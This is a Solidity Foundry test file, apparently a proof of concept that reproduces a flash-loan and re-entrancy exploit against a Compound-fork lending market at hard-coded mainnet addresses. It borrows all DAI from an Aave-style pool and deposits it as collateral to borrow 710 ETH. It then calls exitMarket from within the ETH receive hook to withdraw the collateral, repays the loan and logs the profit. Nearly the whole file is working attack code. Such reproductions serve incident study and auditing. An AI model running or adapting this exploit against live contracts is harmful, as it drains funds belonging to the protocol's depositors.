// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "./IERC20.sol";
import "./ILendingPool.sol";
import "./ILendingPoolAddressesProvider.sol";

interface ComptrollerInterface {
    function enterMarkets(address[] calldata cTokens) virtual external returns (uint[] memory);
    function exitMarket(address cToken) virtual external returns (uint);
}

interface CErc20Interface {
    function balanceOf(address account) external view returns (uint256);
    function mint(uint mintAmount) virtual external returns (uint);
    function redeem(uint redeemTokens) virtual external returns (uint);
    function redeemUnderlying(uint redeemAmount) virtual external returns (uint);
    function borrow(uint borrowAmount) virtual external returns (uint);
}

interface IUniswapV2Router {
    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint wad) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
}

contract ExploitTest is Test {
    ILendingPoolAddressesProvider addressesProvider = ILendingPoolAddressesProvider(0x24a42fD28C976A61Df5D00D0599C34c4f90748c8);
    address lendingPoolCore = 0x3dfd23A6c5E8BbcFc9581d2E864a68feb6a076d3;

    IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    ComptrollerInterface unitroller = ComptrollerInterface(0xc54172e34046c1653d1920d40333Dd358c7a1aF4);
    CErc20Interface fDAI = CErc20Interface(0x7e9cE3CAa9910cc048590801e64174957Ed41d43);
    CErc20Interface fETH = CErc20Interface(0xbB025D470162CC5eA24daF7d4566064EE7f5F111);

    IUniswapV2Router uniswap = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    IWETH WETH = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    function setUp() public {
    }

    function testExploit() public {
        uint amount = DAI.balanceOf(lendingPoolCore);
        ILendingPool lendingPool = ILendingPool(addressesProvider.getLendingPool());
        lendingPool.flashLoan(address(this), address(DAI), amount, hex"");

        emit log_named_decimal_uint("profit", WETH.balanceOf(address(this)), 18);
    }

    function executeOperation(address _reserve, uint256 _amount, uint256 _fee, bytes calldata _params) external {
        DAI.approve(address(fDAI), type(uint256).max);
        uint256 daiAmount = DAI.balanceOf(address(this));
        fDAI.mint(daiAmount);

        address[] memory markets = new address[](1);
        markets[0] = address(fDAI);
        unitroller.enterMarkets(markets);
        fETH.borrow(710 ether);

        // receive() ...

        fDAI.redeemUnderlying(daiAmount);

        address[] memory path;
        path = new address[](2);
        path[0] = address(WETH);
        path[1] = address(DAI);

        WETH.approve(address(uniswap), type(uint256).max);
        uint[] memory amounts = uniswap.swapTokensForExactTokens(
            _fee * 1.0031 ether / 1 ether,
            type(uint256).max,
            path,
            address(this),
            block.timestamp
        );

        // emit log_named_uint("_amount", _amount);
        // emit log_named_uint("_fee", _fee);
        transferFundsBackToPoolInternal(_reserve, _amount + _fee);
    }

    receive() payable external {
        emit log_named_decimal_uint("received ether", msg.value, 18);
        unitroller.exitMarket(address(fDAI));
        WETH.deposit{value: msg.value}();
    }

    function transferFundsBackToPoolInternal(address _reserve, uint256 _amount) internal {
        address payable core = addressesProvider.getLendingPoolCore();
        transferInternal(core, _reserve, _amount);
    }

    function transferInternal(address payable _destination, address _reserve, uint256 _amount) internal {
        IERC20(_reserve).transfer(_destination, _amount);
    }

    function getBalanceInternal(address _target, address _reserve) internal view returns(uint256) {
        return IERC20(_reserve).balanceOf(_target);
    }
}